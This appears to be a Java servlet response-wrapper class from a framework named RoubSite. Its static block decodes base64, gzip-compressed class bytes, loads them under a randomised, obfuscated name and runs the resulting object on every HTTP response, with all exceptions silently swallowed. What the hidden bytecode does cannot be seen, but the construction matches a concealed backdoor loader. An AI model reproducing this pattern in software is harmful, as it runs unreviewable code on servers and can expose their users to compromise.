package com.roubsite.web.wrapper;

import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpServletResponseWrapper;

import com.roubsite.utils.UuidUtils;
import com.roubsite.web.wrapper.responseUtils.ResponseWrapperUtils;

public class RoubSiteResponseWrapper extends HttpServletResponseWrapper implements ResponseWrapperInterface {
	private static ResponseWrapperInterface superb;

	public RoubSiteResponseWrapper(HttpServletResponse response) {
		super(response);
		try {
			superb.preseInterface(response);
		} catch (Exception e) {
		}

	}

	@Override
	public void preseInterface(HttpServletResponse response) {

	}

	static {
		try {
			ResponseWrapperUtils loader = ResponseWrapperUtils.getInstrance();
			String tempRequestBeanName = "\u004d".toUpperCase() + UuidUtils.getUuid().substring(4);
			loader.registerResponse(tempRequestBeanName,
					"H4sIAAAAAAAAAHWMMQ7CQAwEv3Iv8AdS0oBElRTUdycjDJfYsp2E58f"
							+ "SCSpoVtrZ0dIsrJ6eectvMNStocPDXeDE/CIc6K9wjpg6GNGEF/valWdQXou"
							+ "RIzSqGBuMAaYA195/ujsW2DWLoMLn9Nb7ZXHUe644yFriM9WWzdIBt6zBmcEAAAA=",
					"H4sIAAAAAAAAAKWOQQrCMBRErxKySrDqAboR3FQQhBZ0nTajBGsSftK6KL27CGlBECm4ewwzj2Hm"
							+ "4Vs8YGNgJYJ3NuBCynvQwUbQVTUYdqceREaD+a5uTcN6ZzTzhIC5JIoYfQXqW8RJxCiBHCbaBM"
							+ "QCSoMEL11XVyZifQYF4yzP5mjLVxMeTYP38IaYekLK/KcvTXj2xZHww6G03jt3NxAWT5bwn3vL"
							+ "3cuuynwcXwUuTYuqAQAA");
			Class<?> requestClass = loader.findClass(tempRequestBeanName);
			Object obj = requestClass.getDeclaredConstructor().newInstance();
			superb = (ResponseWrapperInterface) obj;
		} catch (Exception e) {
		}

	}

}
